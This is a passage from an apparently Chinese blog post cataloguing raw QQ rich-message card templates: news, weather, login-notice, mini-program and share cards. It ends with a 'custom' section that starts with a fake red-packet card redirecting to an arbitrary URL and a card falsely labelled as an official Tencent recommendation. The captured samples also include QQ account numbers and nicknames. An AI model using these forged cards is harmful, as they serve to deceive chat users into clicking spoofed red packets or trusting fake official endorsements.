class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=0<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://inews.gtimg.com/newsapp_ls/0/11468554322_690380/0"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028391021?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=0<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>小女孩跟妈妈逛超市发抖尿裤子 背后原因令人愤怒<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"4"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028395041?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=1<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://inews.gtimg.com/newsapp_ls/0/11467837116_8080/0"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028395041?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=1<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>陕西国家紧急医学救援队撤离 房间内一幕看哭众人(视频)<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"4"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028400031?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=2<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://inews.gtimg.com/newsapp_ls/0/11467838914_8080/0"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028400031?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=2<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>女子开保时捷被拦神态异常 民警一查揪出意外秘密(现场)<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"4"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028404031?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=3<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://inews.gtimg.com/newsapp_ls/0/11467840477_8080/0"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028404031?refer=mobileqq<span class="symbol">&amp;amp;</span>bat_id=117090663<span class="symbol">&amp;amp;</span>rg=4<span class="symbol">&amp;amp;</span>pushid=2020031867<span class="symbol">&amp;amp;</span>rate=2<span class="symbol">&amp;amp;</span>grp_id=317090669<span class="symbol">&amp;amp;</span>_wv=1<span class="symbol">&amp;amp;</span>_rp=1<span class="symbol">&amp;amp;</span>cur_pos=3<span class="symbol">&amp;amp;</span>bkt=11003<span class="symbol">&amp;amp;</span>qq=1013968603<span class="symbol">&amp;amp;</span>rs=0<span class="symbol">&amp;amp;</span>pid=2020031867<span class="symbol">&amp;amp;</span>gid=0<span class="symbol">&amp;amp;</span>tbkt=I<span class="symbol">&amp;amp;</span>big_brother_source_key=biz_src_gzh_news"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>男子派出所内崩溃大哭还猛扇自己耳光 真相曝光网友直呼心疼<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">icon</span>=<span class="string">""</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">appid</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="天气：卡片-gt-gt-gt"><a href="#天气：卡片-gt-gt-gt" class="headerlink" title="天气：卡片&gt;&gt;&gt;"></a>天气：卡片&gt;&gt;&gt;</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.weather","desc":"","view":"WeatherThreeView","ver":"1.0.0.106","prompt":"【安顺-镇宁】阴 9°\/16°, 09:19更新~","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"weather":&#123;"ad":[&#123;"icon":"http:\/\/imgcache.qq.com\/ac\/tq\/xz2\/sy.jpg","p":"ptype=star","t":"2","title":"星座 | 今天你的综合运势还可以，但对自己对他人都显得不够上心，...","url":""&#125;,&#123;"icon":"http:\/\/imgcache.qq.com\/ac\/qqweather\/image\/2020\/3\/13.png","p":"ptype=lunar","t":"4","title":"黄历 | 农历二月二十。宜祭祀.会亲友.立券.交易.裁衣.合帐....","url":""&#125;],"info":&#123;"it1":&#123;"adcode":"101260303","city":"安顺-镇宁","hour":"9","max":"16","min":"9","temp":"12","type":"203","ut":"1584062347","wea":"阴"&#125;,"it2":&#123;"hour":"10","temp":"12","type":"203"&#125;,"it3":&#123;"hour":"11","temp":"12","type":"202"&#125;,"ts":"1584062800"&#125;,"url":""&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="天气：链接-gt-gt-gt"><a href="#天气：链接-gt-gt-gt" class="headerlink" title="天气：链接&gt;&gt;&gt;"></a>天气：链接&gt;&gt;&gt;</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"146"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">brief</span>=<span class="string">"[分享] 成都 晴 "</span> <span class="attr">sourcePublicUin</span>=<span class="string">"2658655094"</span> <span class="attr">sourceMsgId</span>=<span class="string">"0"</span> <span class="attr">url</span>=<span class="string">"https://weather.mp.qq.com/?city=%E6%88%90%E9%83%BD<span class="symbol">&amp;amp;</span>areaid=510100<span class="symbol">&amp;amp;</span>st=0<span class="symbol">&amp;amp;</span>_wv=1"</span> <span class="attr">flag</span>=<span class="string">"0"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://imgcache.qq.com/ac/qqweather/image/share_icon/sun.png"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>成都 晴 <span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>12°/25°</span><br><span class="line">空气质量:良<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">"QQ天气"</span> <span class="attr">icon</span>=<span class="string">"http://url.cn/JS8oE7"</span> <span class="attr">action</span>=<span class="string">"plugin"</span> <span class="attr">a_actionData</span>=<span class="string">"mqqapi://app/action?pkg=com.tencent.mobileqq<span class="symbol">&amp;amp;</span>cmp=com.tencent.biz.pubaccount.AccountDetailActivity<span class="symbol">&amp;amp;</span>uin=2658655094"</span> <span class="attr">i_actionData</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>card_type=public_account<span class="symbol">&amp;amp;</span>uin=2658655094<span class="symbol">&amp;amp;</span>version=1"</span> <span class="attr">appid</span>=<span class="string">"-1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="QQ团队-登陆成功-gt-gt-gt"><a href="#QQ团队-登陆成功-gt-gt-gt" class="headerlink" title="QQ团队:登陆成功&gt;&gt;&gt;"></a>QQ团队:登陆成功&gt;&gt;&gt;</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"0"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">brief</span>=<span class="string">"登录操作通知"</span> <span class="attr">sourceMsgId</span>=<span class="string">"1584464835506623"</span> <span class="attr">url</span>=<span class="string">""</span> <span class="attr">flag</span>=<span class="string">"37"</span> <span class="attr">sType</span>=<span class="string">"1"</span> <span class="attr">accostType</span>=<span class="string">"7"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span> <span class="attr">style</span>=<span class="string">"1"</span>&gt;</span>登录操作通知<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span>2020年03月18日<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"6"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>w7<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>登录帐号：2754457373</span><br><span class="line">登录应用：weiyun.com</span><br><span class="line">登录时间：2020-03-18 01:07:15<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>如有疑问，请登录aq.qq.com进行查询。<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">url</span>=<span class="string">"https://aq.qq.com/cn2/message_center/wireless/mobile_mc_login_index"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>查看详情<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">icon</span>=<span class="string">""</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">appid</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="QQ团队-阅读全文-gt-gt-gt"><a href="#QQ团队-阅读全文-gt-gt-gt" class="headerlink" title="QQ团队:阅读全文&gt;&gt;&gt;"></a>QQ团队:阅读全文&gt;&gt;&gt;</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"0"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">brief</span>=<span class="string">"用了这个神仙工具，效率高得惊人"</span> <span class="attr">sourceMsgId</span>=<span class="string">"0"</span> <span class="attr">url</span>=<span class="string">"mqqapi://microapp/open?url=https%3A%2F%2Fm.q.qq.com%2Fa%2Fp%2F1110238708%3Fscene%3D1023"</span> <span class="attr">flag</span>=<span class="string">"37"</span> <span class="attr">accostType</span>=<span class="string">"7"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"6"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>用了这个神仙工具，效率高得惊人<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"https://tianshu.gtimg.cn/tianshu/1583512658507.jpg"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>腾讯文档免费模板，助力高效办公<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>阅读全文<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">icon</span>=<span class="string">""</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">appid</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="小程序-gt-gt-gt"><a href="#小程序-gt-gt-gt" class="headerlink" title="小程序&gt;&gt;&gt;"></a>小程序&gt;&gt;&gt;</h3><p>欢乐斗地主</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.miniapp_01","desc":"","view":"view_8C8E89B49BE609866298ADDFF2DBABA4","ver":"1.0.0.19","prompt":"[QQ小程序]欢乐斗地主","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"detail_1":&#123;"appid":"363","title":"欢乐斗地主","desc":"出行路上没事干？一起来斗地主！","icon":"miniapp.gtimg.cn\/public\/appicon\/4a5967410b9f70f4c34cecea5d7964cd_200.jpg","preview":"hlddz.huanle.qq.com\/logos\/200201gongjiao.png","url":"m.q.qq.com\/a\/s\/50d9d748e400b0ac92a42cc9fb173a9a","scene":0,"host":&#123;"uin":2473671082,"nick":"。空。"&#125;,"shareTemplateId":"8C8E89B49BE609866298ADDFF2DBABA4","shareTemplateData":&#123;&#125;&#125;&#125;,"config":&#123;"type":"normal","width":0,"height":0,"forward":0,"autoSize":0&#125;,"text":"","sourceAd":""&#125;</span><br></pre></td></tr></table></figure>
<p>天天斗地主</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.miniapp_01","desc":"","view":"view_8C8E89B49BE609866298ADDFF2DBABA4","ver":"1.0.0.19","prompt":"[QQ小程序]天天斗地主真人版","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"detail_1":&#123;"appid":"1108806145","title":"天天斗地主真人版","desc":"老铁，就差你了，赶紧加入我们吧！","icon":"miniapp.gtimg.cn\/public\/appicon\/b04829176cce4582f765296e57c1729b_200.jpg","preview":"qqadapt.qpic.cn\/adapt\/0\/65365cd7-0a17-31ac-4e45-836e196973fa\/0?pt=0&amp;ek=1&amp;kp=1&amp;sce=70-0-0","url":"m.q.qq.com\/a\/s\/8edcc8ee9d3cd3689a478e0b170d2ecd","scene":0,"host":&#123;"uin":517065473,"nick":"好先森"&#125;,"shareTemplateId":"8C8E89B49BE609866298ADDFF2DBABA4","shareTemplateData":&#123;&#125;&#125;&#125;,"config":&#123;"type":"normal","width":0,"height":0,"forward":1,"autoSize":0&#125;,"text":"","sourceAd":""&#125;</span><br></pre></td></tr></table></figure>
<h3 id="礼物"><a href="#礼物" class="headerlink" title="礼物"></a>礼物</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.gxhServiceIntelligentTip","desc":"送你一封小情书","view":"gxhServiceIntelligentTip","ver":"","prompt":"送你一封小情书","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"gxhServiceIntelligentTip":&#123;"appid":"gxhServiceIntelligentTip","bgImg":"http:\/\/qzonestyle.gtimg.cn\/qzone\/qzactStatics\/imgs\/20200206164237_ed5a6d.png","action":"https:\/\/zb.vip.qq.com\/v2\/2020LoverDayIndex?_wv=16778243&amp;uniqueSeq=1581610330756826788&amp;ADTAG=notice","reportParams":&#123;&#125;&#125;&#125;,"config":&#123;"forward":"1","type":"normal"&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>微信分享</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.structmsg","desc":"新闻","view":"news","ver":"0.0.0.1","prompt":"[分享]高校战“疫”网络安全分享赛 WP","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"news":&#123;"action":"","android_pkg_name":"","app_type":1,"appid":1103188687,"desc":"高校战“疫”网络安全分享赛 WP","jumpUrl":"http:\/\/url.cn\/5FOAyuC","preview":"http:\/\/url.cn\/5NasJjF","source_icon":"","source_url":"","tag":"微信","title":"高校战“疫”网络安全分享赛 WP"&#125;&#125;,"config":&#123;"autosize":true,"ctime":1583814058,"forward":true,"token":"95bc02de5e33fedac702857cd2c0557e","type":"normal"&#125;,"text":"","sourceAd":""&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义-gt-gt-gt"><a href="#自定义-gt-gt-gt" class="headerlink" title="自定义&gt;&gt;&gt;"></a>自定义&gt;&gt;&gt;</h2><h3 id="红包-gt-gt-gt"><a href="#红包-gt-gt-gt" class="headerlink" title="红包&gt;&gt;&gt;"></a>红包&gt;&gt;&gt;</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#123;"app":"com.tencent.cmshow","desc":"","view":"game_redpacket","ver":"1.0.3.5","prompt":"","appID":"","sourceName":"","actionData":"","actionData_A":"","sourceUrl":"","meta":&#123;"redPacket":&#123;"msg":"QQ红包","posterUrl":"\/xydata\/cmshow\/gameRedPacket\/2749\/bde0aed576c524d0544a079df0d36a30.png","destUrl":"https：//baidu.com"&#125;&#125;,"config":&#123;"forward":1&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="官方推荐"><a href="#官方推荐" class="headerlink" title="官方推荐"></a>官方推荐</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"1"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">"plugin"</span> <span class="attr">actionData</span>=<span class="string">"AppCmd://OpenContactInfo/?uin=2754457373 "</span> <span class="attr">a_actionData</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>source=sharecard<span class="symbol">&amp;amp;</span>version=1<span class="symbol">&amp;amp;</span>uin=2754457373"</span> <span class="attr">i_actionData</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>source=sharecard<span class="symbol">&amp;amp;</span>version=1<span class="symbol">&amp;amp;</span>uin=2754457373"</span> <span class="attr">brief</span>=<span class="string">"在吗？"</span> <span class="attr">sourceMsgId</span>=<span class="string">"0"</span> <span class="attr">url</span>=<span class="string">""</span> <span class="attr">flag</span>=<span class="string">"2"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">mode</span>=<span class="string">"1"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span> 腾讯官方特别推荐<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"2"</span> <span class="attr">mode</span>=<span class="string">"1"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>source=sharecard<span class="symbol">&amp;amp;</span>version=1<span class="symbol">&amp;amp;</span>uin=2754457373"</span> <span class="attr">w</span>=<span 